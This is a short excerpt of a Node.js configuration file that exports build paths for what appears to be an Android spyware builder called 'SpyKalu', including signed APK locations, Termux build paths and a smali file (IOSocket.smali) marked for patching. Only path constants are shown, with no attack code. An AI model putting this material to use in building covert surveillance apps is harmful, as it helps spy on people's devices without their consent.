...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/SpyKalu.apk')

exports.termuxApkBuildPath = exports.termux + '/spykalu/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/spykalu/SpyKalu.apk'
...
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/kaluramkhorwal3/spykalu/IOSocket.smali');
